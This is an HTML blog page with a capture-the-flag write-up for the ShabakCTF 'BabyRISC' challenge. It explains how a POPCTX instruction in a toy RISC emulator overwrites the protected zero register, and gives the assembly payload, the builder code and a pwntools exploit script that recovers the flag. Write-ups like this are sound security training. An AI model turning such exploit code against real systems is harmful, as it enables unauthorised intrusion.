@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <link rel="stylesheet" href="../static/style.css">
+    <title>RootBlog</title>
+</head>
+
+<body>
+
+<div class="top-block">
+    <h1 class="Welcome">Welcome To The Root's Blog</h1>
+    <a href="/CyberBlog/index.html"><button class="Home">Home</button></a>
+    <a href="/CyberBlog/about.html"><button class="About">About</button></a>
+    <img class="RootLogo" src="/CyberBlog/static/images/root_logo.png">
+</div>
+<div class="sidebar">
+    <details open>
+        <summary>Writeups</summary>
+        <details class="sub">
+            <summary>pwnable.kr</summary>
+            <ul>
+                <li><a href="fd.html">fd</a></li>
+                <li><a href="horcruxes.html">horcruxes</a></li>
+            </ul>
+        </details>
+        <details class="sub">
+            <summary>picoCTF</summary>
+            <ul>
+                <li><a href="babygame01.html">babygame01</a></li>
+            </ul>
+        </details>
+        <details class="sub" open>
+            <summary>ShabakCTF-2021</summary>
+            <ul>
+                <li><a href="babyrisc.html" class="current">BabyRISC</a></li>
+            </ul>
+        </details>
+    </details>
+</div>
+
+<div class="main-content">
+<h2 style="color:#F9F3EF;">ShabakCTF Challenge: "BabyRISC"</h2>
+<p class="post-meta">Published: 08.11.2026</p>
+<p style="color:#F9F3EF;"><strong style="color:#7B9AD1;">Description of the challenge:</strong><br>
+Following ARM's success, I went ahead and designed my own RISC assembly language.<br>
+I wrote an emulator, so you'll be able to run your own programs and enjoy the (very) reduced instruction set!<br>
+
+Of course, with such minimal implementation, reading the flag is impossible.</p><br>
+
+<p>In this challange, We get the binary, the source and a Dockerfile - so no need for a decompiler this time, we just read the C.</p>
+
+<div class="terminal-block"><pre>
+$ ls
+babyrisc    	Dockerfile  	flag  			Makefile         src
+dockerfile  	inc  		payload_builder  	ynetd
+</pre>
+</div>
+
+<p>So lets first understand what we got. we can see that in src we got some files:</p>
+<div class="terminal-block"><pre>
+src$ ls
+asm_execution.c  	asm_file_generation.c  	asm_file_parsing.c  asm_instructions.c
+asm_processor_state.c  	main.c  		prompt.c
+</pre>
+</div>
+
+<p>After reading the files it looks like an emulator for a risc assembly (a simpler version of RISC-V).<br>
+For me it was a bit complicated to remmber all the functions and what they return and take, so i created a file with all functions and listed and where they belongs to, and also some definesso i could have it all in one file - not neccessery but it helped me:</p>
+
+<div class="code-block"><pre>
+functions:
+----------
+	Written functions:🔵
+		==== main.c ====
+		👑<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">main</span>(<span style="color:#FF9E4A;">void</span>)
+			- <span style="color:#A351D1;">disable_io_buffering</span>()
+			- <span style="color:#A351D1;">generate_admin_code</span>(admin_payload, <span style="color:#E2342D;">sizeof</span>(admin_payload), <span style="color:#F85828;">&</span>admin_payload_size)
+			- <span style="color:#A351D1;">read_user_code</span>(user_payload, <span style="color:#E2342D;">sizeof</span>(user_payload), <span style="color:#F85828;">&</span>user_payload_size)
+			- <span style="color:#E2342D;">malloc</span>(combined_payload_size)
+			- <span style="color:#E2342D;">memcpy</span>(combined_payload, user_payload, user_payload_size)
+			- <span style="color:#E2342D;">memcpy</span>(<span style="color:#F85828;">&</span>combined_payload[user_payload_size], admin_payload, admin_payload_size)
+			- <span style="color:#A351D1;">execute_asm_memory</span>(combined_payload, combined_payload_size)
+
+		🧠<span style="color:#4DA6FF;">static</span> <span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">generate_admin_code</span>(<span style="color:#FF9E4A;">uint8_t</span> * payload, <span style="color:#FF9E4A;">size_t</span> max_size, <span style="color:#FF9E4A;">size_t</span> * payload_size_out);
+			- <span style="color:#A351D1;">read_flag</span>(flag_string, <span style="color:#E2342D;">sizeof</span>(flag_string));
+			- <span style="color:#A351D1;">fmemopen</span>(payload, max_size, <span style="color:#00FF7F;">"w"</span>)
+			- <span style="color:#A351D1;">file_write_opcode</span>(payload_fp, PRINTNL)
+			- <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, <span style="color:#FF9E4A;">42</span>)
+			- <span style="color:#A351D1;">file_write_opcode3</span>(payload_fp, MUL, ASM_REGISTER_R2, ASM_REGISTER_R0, ASM_REGISTER_R1)
+			- <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, SUBI, ASM_REGISTER_R2, ASM_REGISTER_R2, <span style="color:#FF9E4A;">1</span>)
+			- <span style="color:#A351D1;">file_write_opcode1</span>(payload_fp, RETNZ, ASM_REGISTER_R2)
+			- <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, dword)
+			- <span style="color:#A351D1;">file_write_opcode1</span>(payload_fp, PRINTC, ASM_REGISTER_R1)
+			- <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ROR, ASM_REGISTER_R1, ASM_REGISTER_R1, <span style="color:#FF9E4A;">8</span>)
+			- <span style="color:#A351D1;">file_write_opcode</span>(payload_fp, PRINTNL)
+			- <span style="color:#A351D1;">file_write_opcode</span>(payload_fp, RET)
+
+
+		🧠<span style="color:#4DA6FF;">static</span> <span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">read_user_code</span>(<span style="color:#FF9E4A;">uint8_t</span> * payload, <span style="color:#FF9E4A;">size_t</span> max_size, <span style="color:#FF9E4A;">size_t</span> * payload_size_out);
+			- <span style="color:#E2342D;">fread</span>(payload <span style="color:#F85828;">+</span> current_offset, <span style="color:#FF9E4A;">1</span>, <span style="color:#FF9E4A;">1</span>, stdin)
+			- <span style="color:#E2342D;">memcmp</span>(<span style="color:#F85828;">&</span>terminate_marker, <span style="color:#F85828;">&</span>payload[current_offset <span style="color:#F85828;">-</span> marker_size], marker_size) <span style="color:#F85828;">==</span> <span style="color:#FF9E4A;">0</span>)
+
+
+		==== asm_file_generation.c ====
+		🔴<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_write_opcode</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_opcode_t opcode);
+			- <span style="color:#A351D1;">file_write_opcode</span>(fp, opcode)
+		🔴<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_write_opcode1</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_opcode_t opcode, asm_register_t reg0);
+			- <span style="color:#A351D1;">file_write_opcode</span>(fp, opcode)
+			- <span style="color:#A351D1;">file_write_reg</span>(fp, reg0)
+		🔴<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_write_opcode2</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_opcode_t opcode, asm_register_t reg0, 
+					 asm_register_t reg1);
+			- <span style="color:#A351D1;">file_write_opcode1</span>(fp,opcode,reg0)
+			- <span style="color:#A351D1;">file_write_reg</span>(fp, reg1)
+		🔴<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_write_opcode3</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_opcode_t opcode, asm_register_t reg0, 
+					 asm_register_t reg1, asm_register_t reg2);
+			- <span style="color:#A351D1;">file_write_opcode2</span>(fp,opcode,reg0,reg1)
+			- <span style="color:#A351D1;">file_write_reg</span>(fp, reg2)
+		🔴<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_opcode_t opcode, asm_register_t reg0, 
+					      asm_register_t reg1, int32_t imm2);
+			- <span style="color:#A351D1;">file_write_opcode2</span>(fp,opcode,reg0,reg1)
+			- <span style="color:#E2342D;">fwrite</span>(<span style="color:#F85828;">&</span>imm2, <span style="color:#E2342D;">sizeof</span>(int32_t), <span style="color:#FF9E4A;">1</span>, fp)
+		🔴<span style="color:#4DA6FF;">static</span> <span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_write_reg</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_register_t reg);
+			- <span style="color:#E2342D;">fwrite</span>(<span style="color:#F85828;">&</span>reg, <span style="color:#E2342D;">sizeof</span>(reg_t), <span style="color:#FF9E4A;">1</span>, fp)
+
+
+		==== asm_execution.c ====
+		⚫<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">execute_asm_memory</span>(<span style="color:#FF9E4A;">void</span> * asm_bytes, size_t len);
+			- <span style="color:#A351D1;">fmemopen</span>(asm_bytes, len, <span style="color:#00FF7F;">"r"</span>)
+			- <span style="color:#A351D1;">execute_asm_file</span>(fp)
+		⚫<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">execute_asm_file</span>(<span style="color:#FF9E4A;">FILE</span> * fp);
+			- <span style="color:#A351D1;">parse_exec_asm_file</span>(fp, <span style="color:#F85828;">&</span>count)
+		⚫<span style="color:#4DA6FF;">static</span> <span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">parse_exec_asm_file</span>(<span style="color:#FF9E4A;">FILE</span> * fp, int * count_out);
+			- <span style="color:#A351D1;">initialize_context</span>()
+			- <span style="color:#A351D1;">file_parse_opcode</span>(fp, <span style="color:#F85828;">&</span>opcode)
+
+
+		==== asm_processor_state.c ====
+		🟠<span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">initialize_context</span>(<span style="color:#FF9E4A;">void</span>);
+			- <span style="color:#E2342D;">memset</span>(registers)
+			- <span style="color:#E2342D;">memset</span>(asm_stack)
+		🟠<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">read_reg</span>(asm_register_t reg, reg_value_t * reg_out);
+		🟠<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">write_reg</span>(asm_register_t reg, reg_value_t value)
+
+
+		==== asm_file_parsing.c ====
+		🟣<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_parse_opcode</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_opcode_t * opcode_out)
+			- <span style="color:#E2342D;">fread</span>(<span style="color:#F85828;">&</span>opcode, <span style="color:#E2342D;">sizeof</span>(opcode), <span style="color:#FF9E4A;">1</span>, fp)
+		🟣<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_parse_imm32</span>(<span style="color:#FF9E4A;">FILE</span> * fp, int32_t * imm32_out)
+			- <span style="color:#E2342D;">fread</span>(<span style="color:#F85828;">&</span>imm32, <span style="color:#E2342D;">sizeof</span>(imm32), <span style="color:#FF9E4A;">1</span>, fp)
+		🟣<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">file_parse_reg</span>(<span style="color:#FF9E4A;">FILE</span> * fp, asm_register_t * reg_out)
+			- <span style="color:#E2342D;">fread</span>(<span style="color:#F85828;">&</span>reg, <span style="color:#E2342D;">sizeof</span>(reg), <span style="color:#FF9E4A;">1</span>, fp)
+
+
+		==== prompt.c ====
+		🟢<span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">print_prompt</span>(<span style="color:#FF9E4A;">void</span>);
+
+
+
+
+asm_processor_state.h ::
+
+
+<span style="color:#4DA6FF;">#pragma</span> once
+<span style="color:#4DA6FF;">#ifndef</span> __ASM_PROCESSOR_STATE_H
+<span style="color:#4DA6FF;">#define</span> __ASM_PROCESSOR_STATE_H
+
+<span style="color:#4DA6FF;">#include</span> <span style="color:#00FF7F;">"asm_types.h"</span>
+<span style="color:#4DA6FF;">#include</span> <span style="color:#00FF7F;">"common.h"</span>
+
+<span style="color:#6C6C6C;">// Registers indices</span>
+<span style="color:#4DA6FF;">typedef</span> <span style="color:#4DA6FF;">enum</span> asm_register_e
+{
+    ASM_REGISTER_START,
+    ASM_REGISTER_ZERO <span style="color:#F85828;">=</span> ASM_REGISTER_START,
+    ASM_REGISTER_R0,
+    ASM_REGISTER_R1,
+    ASM_REGISTER_R2,
+    ASM_REGISTER_R3,
+    ASM_REGISTER_R4,
+    ASM_REGISTER_R5,
+    ASM_REGISTER_R6,
+    ASM_REGISTER_SP,
+    ASM_REGISTER_END
+} asm_register_t;
+
+<span style="color:#4DA6FF;">#define</span> ASM_STACK_SIZE (<span style="color:#FF9E4A;">4096</span>)
+<span style="color:#4DA6FF;">extern</span> <span style="color:#FF9E4A;">uint8_t</span> asm_stack[ASM_STACK_SIZE];
+<span style="color:#4DA6FF;">extern</span> reg_value_t registers[ASM_REGISTER_END <span style="color:#F85828;">-</span> ASM_REGISTER_START];
+
+<span style="color:#FF9E4A;">void</span> <span style="color:#A351D1;">initialize_context</span>(<span style="color:#FF9E4A;">void</span>);
+<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">read_reg</span>(asm_register_t reg, reg_value_t * reg_out);
+<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">write_reg</span>(asm_register_t reg, reg_value_t value);
+
+<span style="color:#4DA6FF;">#endif</span> <span style="color:#6C6C6C;">/* __ASM_PROCESSOR_STATE_H */</span>
+-----------------------------------------------
+
+<span style="color:#6C6C6C;">// Types (sizes in binary-encoding) for instructions components</span>
+<span style="color:#4DA6FF;">typedef</span> <span style="color:#FF9E4A;">uint8_t</span> reg_t;
+<span style="color:#4DA6FF;">typedef</span> <span style="color:#FF9E4A;">uint8_t</span> opcode_t;
+<span style="color:#4DA6FF;">typedef</span> <span style="color:#FF9E4A;">int32_t</span> reg_value_t;
+-----------------------------------------------
+
+<span style="color:#6C6C6C;">// Define binary operation (which is: "reg0 = reg1 (op) reg2")</span>
+</pre>
+</div>
+
+<p>
+Instructions like <span style="color:#A351D1;">ADDI</span>, <span style="color:#A351D1;">SUBI</span>, <span style="color:#A351D1;">MUL</span>, <span style="color:#A351D1;">PUSH</span>/<span style="color:#A351D1;">POP</span> work on one register at a time, but <span style="color:#A351D1;">PUSHCTX</span>/<span style="color:#A351D1;">POPCTX</span> push and pop <strong>all</strong> the registers together, as one block on the stack. keep that in mind, its the important part later. this is all the opcodes we have- each one is a function by itself, so those are just the names:
+</p>
+<div class="code-block"><pre>
+<span style="color:#4DA6FF;">#define</span> INSTRUCTION_SYMBOL(opcode) [opcode] <span style="color:#F85828;">=</span> __INSTRUCTION_DEFINE_##opcode
+instruction_definition_t asm_instruction_definitions[MAX_ASM_OPCODE_VAL] <span style="color:#F85828;">=</span> {
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(ADD),     <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(ADDI),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(AND),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(ANDI),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(DIV),     <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(DIVI),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(MUL),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(MULI),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(OR),      <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(ORI),     <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(PRINTC), <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(PRINTDD),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(PRINTDX), <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(PRINTNL), <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(RET),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(RETNZ),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(RETZ),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(ROL),     <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(ROR),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(SHL),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(SHR),     <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(SUB),     <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(SUBI),   <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(XOR),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(XORI),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(PUSH),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(POP),    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(PUSHCTX),
+    <span style="color:#A351D1;">INSTRUCTION_SYMBOL</span>(POPCTX),
+};
+</pre>
+</div>
+<p>ok so now we know what tools we have - lets see how they actually get used, starting with main() in main.c to understnad the code flow better:</p>
+<div class="code-block"><pre>
+<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">main</span>(<span style="color:#FF9E4A;">void</span>){
+    <span style="color:#A351D1;">disable_io_buffering</span>();
+    <span style="color:#A351D1;">generate_admin_code</span>(admin_payload, <span style="color:#E2342D;">sizeof</span>(admin_payload), <span style="color:#F85828;">&</span>admin_payload_size);
+    <span style="color:#A351D1;">read_user_code</span>(user_payload, <span style="color:#E2342D;">sizeof</span>(user_payload), <span style="color:#F85828;">&</span>user_payload_size);
+    <span style="color:#E2342D;">malloc</span>(combined_payload_size);
+    <span style="color:#E2342D;">memcpy</span>(combined_payload, user_payload, user_payload_size);
+    <span style="color:#E2342D;">memcpy</span>(<span style="color:#F85828;">&</span>combined_payload[user_payload_size], admin_payload, admin_payload_size);
+    <span style="color:#A351D1;">execute_asm_memory</span>(combined_payload, combined_payload_size);
+}
+</pre>
+</div>
+
+<p>
+the admin code (made in <span style="color:#A351D1;">generate_admin_code</span>) seems intresting, it checks something - lets take a look at main.c at the generate_admin_code function:
+</p>
+<div class="code-block"><pre>
+<span style="color:#6C6C6C;">// If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag</span>
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, <span style="color:#FF9E4A;">42</span>);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode3</span>(payload_fp, MUL, ASM_REGISTER_R2, ASM_REGISTER_R0, ASM_REGISTER_R1);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, SUBI, ASM_REGISTER_R2, ASM_REGISTER_R2, <span style="color:#FF9E4A;">1</span>);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode1</span>(payload_fp, RETNZ, ASM_REGISTER_R2);
+</pre>
+</div>
+
+
+<p>
+So we understand it firstly generates admin code and then reads our code - so its admin code then our code - mabey we can change some things the admin code set, but first lets understand what the admin code generates:
+</p>
+<div class="code-block"><pre>
+R1 <span style="color:#F85828;">=</span> <span style="color:#A351D1;">$0</span> <span style="color:#F85828;">+</span> <span style="color:#FF9E4A;">42</span>	<span style="color:#6C6C6C;">// meaning: R1 = 42</span>
+R2 <span style="color:#F85828;">=</span> R0<span style="color:#F85828;">*</span>R1 	<span style="color:#6C6C6C;">// meaning: R2 = R0*42</span>
+R2 <span style="color:#F85828;">=</span> R2<span style="color:#F85828;">-</span><span style="color:#FF9E4A;">1</span>
+<span style="color:#4DA6FF;">if</span> R2<span style="color:#F85828;">!=</span><span style="color:#FF9E4A;">0</span>
+	<span style="color:#4DA6FF;">return</span>	<span style="color:#6C6C6C;">//meaing: exit</span>
+<span style="color:#4DA6FF;">else</span>
+	prints the flag
+</pre>
+</div>
+<p>
+So to get the flag we understand we basiclly need to pass the check: <code>R0*42 == 1</code> -&gt; flag printed - problem solved?<br>
+No. The check itself is impossible to pass. Although we can control <code>R0</code> register, it wont help - we need some how to make smth * 42 to be 1.<br>
+The only option is overflow, but when we check, the program works on 32 bit - meaning we wont be able to get to 1, only even numbers...<br>
+We also cant just change <code>$0</code> to smth else since it has a securoty check for it, and if its changed then the program exits, lets see why (in asm_processor_state.c):
+</p>
+<div class="code-block"><pre>
+<span style="color:#FF9E4A;">int</span> <span style="color:#A351D1;">write_reg</span>(asm_register_t reg, reg_value_t value)
+{
+    <span style="color:#4DA6FF;">if</span> (reg <span style="color:#F85828;">&lt;</span> <span style="color:#FF9E4A;">0</span> <span style="color:#F85828;">||</span> reg <span style="color:#F85828;">&gt;=</span> <span style="color:#E2342D;">sizeof</span>(registers) / <span style="color:#E2342D;">sizeof</span>(reg_value_t))
+    {
+        <span style="color:#4DA6FF;">return</span> E_W_INVLD_REG;
+    }
+    <span style="color:#4DA6FF;">else if</span> (reg <span style="color:#F85828;">==</span> ASM_REGISTER_ZERO)
+    {
+        <span style="color:#4DA6FF;">return</span> E_W2ZERO;
+    }
+
+    registers[reg] <span style="color:#F85828;">=</span> value;
+    <span style="color:#4DA6FF;">return</span> E_SUCCESS;
+}
+</pre>
+</div>
+<p>
+We can see the line that checks $0:
+<div class="code-block"><pre>
+    <span style="color:#4DA6FF;">else if</span> (reg <span style="color:#F85828;">==</span> ASM_REGISTER_ZERO)
+    {
+        <span style="color:#4DA6FF;">return</span> E_W2ZERO;
+    }
+</pre>
+</div>
+<p> 
+This part checks if $0 is written to, if so it sends error. now all the opcodes uses this security check.. besides one:
+</p>
+
+<div class="code-block"><pre>
+<span style="color:#A351D1;">INSTRUCTION_DEFINE_OP0</span>(POPCTX)
+{
+    <span style="color:#FF9E4A;">int</span> ret <span style="color:#F85828;">=</span> E_SUCCESS;
+    reg_value_t sp_val <span style="color:#F85828;">=</span> <span style="color:#FF9E4A;">0</span>;
+
+    ret <span style="color:#F85828;">=</span> <span style="color:#A351D1;">read_reg</span>(ASM_REGISTER_SP, <span style="color:#F85828;">&</span>sp_val);
+    <span style="color:#4DA6FF;">if</span> (ret <span style="color:#F85828;">!=</span> E_SUCCESS)
+    {
+        <span style="color:#4DA6FF;">goto</span> cleanup;
+    }
+
+    <span style="color:#4DA6FF;">if</span> (sp_val <span style="color:#F85828;">&lt;</span> (reg_value_t)<span style="color:#E2342D;">sizeof</span>(registers) <span style="color:#F85828;">||</span> sp_val <span style="color:#F85828;">&gt;</span> (reg_value_t)ASM_STACK_SIZE)
+    {
+        ret <span style="color:#F85828;">=</span> E_STACK_VIOLATION;
+        <span style="color:#4DA6FF;">goto</span> cleanup;
+    }
+
+    sp_val <span style="color:#F85828;">-=</span> <span style="color:#E2342D;">sizeof</span>(registers);
+    <span style="color:#E2342D;">memcpy</span>(registers, <span style="color:#F85828;">&</span>asm_stack[sp_val], <span style="color:#E2342D;">sizeof</span>(registers));
+
+cleanup:
+    <span style="color:#4DA6FF;">return</span> ret;
+}
+</pre>
+</div>
+<p> We can see that an intresting instruction, what it does is the opposite of pushctx whcoh push all regsiters exist in this program to the stack together, while popctx pop it all back - meaning its writing back to the regsiter same order. The problem? It's writing to registers including $0 with no securoty check we mentioned before. We can exploit it to be able to change $0 and that means we could get the flag!<br>Forgot to mention we are given a ready payload file that helps us generate opcodes in babyRisc assembly in payload_builder/build_payload.c .
+<br><br> So we need to do the follow:
+</p>
+
+<div class="code-block"><pre>
+SUBI    R0, ZERO, <span style="color:#FF9E4A;">41</span> 	<span style="color:#6C6C6C;">//r0 = -41->later $0=-41</span>
+ADDI    R1, ZERO, <span style="color:#FF9E4A;">1</span>	<span style="color:#6C6C6C;">//r1 = 1->later r0=1</span>
+ADDI    R2, ZERO, <span style="color:#FF9E4A;">0</span>	<span style="color:#6C6C6C;">//r2 = 0->later r1=0</span>
+ADDI    R3, ZERO, <span style="color:#FF9E4A;">0</span>	<span style="color:#6C6C6C;">//r3 = 0->later r2=0</span>
+PUSHCTX			<span style="color:#6C6C6C;">// push all registers to stack</span>
+PUSH    R2		<span style="color:#6C6C6C;">//make the stack pointer go up by one (R1->$0,R2->R1...)</span>
+POPCTX			<span style="color:#6C6C6C;">// pop to all registers from stack, with the corupted values so it'll print flag.</span>
+</pre>
+</div>
+<p> This is the payload - what i changed in build_paylod.c:</p>
+<div class="code-block"><pre>
+<span style="color:#6C6C6C;">// Fill some registers and return</span>
+<span style="color:#6C6C6C;">// (Because E_SUCCESS == 0, we just OR all the return values, to check for error when we finish).</span>
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, SUBI, ASM_REGISTER_R0, ASM_REGISTER_ZERO, (int32_t)<span style="color:#FF9E4A;">41</span>);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ADDI, ASM_REGISTER_R1, ASM_REGISTER_ZERO, (int32_t)<span style="color:#FF9E4A;">0x1</span>);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ADDI, ASM_REGISTER_R2, ASM_REGISTER_ZERO, (int32_t)<span style="color:#FF9E4A;">0x0</span>);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode_imm32</span>(payload_fp, ADDI, ASM_REGISTER_R3, ASM_REGISTER_ZERO, (int32_t)<span style="color:#FF9E4A;">0x0</span>);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode</span>(payload_fp,PUSHCTX);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode1</span>(payload_fp,PUSH, (asm_register_t)ASM_REGISTER_R2);
+ret <span style="color:#F85828;">|=</span> <span style="color:#A351D1;">file_write_opcode</span>(payload_fp,POPCTX);
+</pre>
+</div>
+<p>
+after we compile it we get the payload, now we need to send it to the program. Here is the script (exploit) i wrote:
+</p>
+
+<div class="code-block"><pre>
+<span style="color:#4DA6FF;">from</span> <span style="color:#A351D1;">pwn</span> <span style="color:#4DA6FF;">import</span> *
+
+<span style="color:#4DA6FF;">with</span> <span style="color:#E2342D;">open</span>(<span style="color:#00FF7F;">'payload_builder/build_payload_cp/payload.bin'</span>, <span style="color:#00FF7F;">'rb'</span>) <span style="color:#4DA6FF;">as</span> f:
+	payload <span style="color:#F85828;">=</span> f.<span style="color:#E2342D;">read</span>()
+c <span style="color:#F85828;">=</span> <span style="color:#E2342D;">remote</span>(<span style="color:#00FF7F;">'localhost'</span>,<span style="color:#FF9E4A;">9020</span>)
+c.<span style="color:#E2342D;">send</span>(payload)
+c.<span style="color:#E2342D;">recvuntil</span>(<span style="color:#00FF7F;">b"Executing code!"</span>)
+raw_data <span style="color:#F85828;">=</span> c.<span style="color:#E2342D;">recvall</span>()
+
+data_stripped <span style="color:#F85828;">=</span> raw_data.<span style="color:#E2342D;">split</span>(<span style="color:#00FF7F;">b">>>"</span>)[<span style="color:#FF9E4A;">0</span>].<span style="color:#E2342D;">replace</span>(<span style="color:#00FF7F;">b"\x1b[0m"</span>,<span style="color:#00FF7F;">b""</span>).<span style="color:#E2342D;">strip</span>()
+ldata <span style="color:#F85828;">=</span> []
+<span style="color:#4DA6FF;">for</span> i <span style="color:#4DA6FF;">in</span> <span style="color:#E2342D;">range</span>(<span style="color:#FF9E4A;">0</span>,<span style="color:#E2342D;">len</span>(data_stripped),<span style="color:#FF9E4A;">4</span>):
+    chunk <span style="color:#F85828;">=</span> data_stripped[i:i<span style="color:#F85828;">+</span><span style="color:#FF9E4A;">4</span>]
+    <span style="color:#4DA6FF;">if</span>(<span style="color:#E2342D;">len</span>(chunk) <span style="color:#F85828;">&gt;</span><span style="color:#FF9E4A;">0</span>):
+        ldata.<span style="color:#E2342D;">append</span>(chunk.<span style="color:#E2342D;">ljust</span>(<span style="color:#FF9E4A;">4</span>,<span style="color:#00FF7F;">b'\x00'</span>))
+
+flag <span style="color:#F85828;">=</span> <span style="color:#00FF7F;">b""</span>
+<span style="color:#4DA6FF;">for</span> d <span style="color:#4DA6FF;">in</span> ldata:
+    flag<span style="color:#F85828;">+=</span><span style="color:#E2342D;">p32</span>(<span style="color:#E2342D;">u32</span>(d)<span style="color:#F85828;">+</span><span style="color:#FF9E4A;">41</span>)
+<span style="color:#E2342D;">print</span>(<span style="color:#00FF7F;">"------"</span>)
+<span style="color:#E2342D;">print</span>(flag.<span style="color:#E2342D;">split</span>(<span style="color:#00FF7F;">b'\x00'</span>)[<span style="color:#FF9E4A;">0</span>])
+<span style="color:#E2342D;">print</span>(<span style="color:#00FF7F;">"------"</span>)
+c.<span style="color:#E2342D;">interactive</span>()
+
+</pre>
+</div>
+
+<p>
+every 4 bytes the admin code prints is off by the same -41 we loaded into R0 at the start, so adding 41 back to every chunk when we parse it gives us back the real flag bytes.
+</p>
+
+<p>so when we run it (i ran it localy since the remote wasn't working anymore):</p>
+
+<div class="terminal-block"><pre>
+$ python3 exploit.py
+------
+flag{RISC_doesnt_reduce_amount_of_bugs_after_all}
+------
+</pre>
+</div>
+
+<p>
+and theres our flag:<br>
+<span style="color:#00FF7F;">flag{RISC_doesnt_reduce_amount_of_bugs_after_all}</span>
+</p>
+<br>
+
+</div>
+
+</body>
+</html>
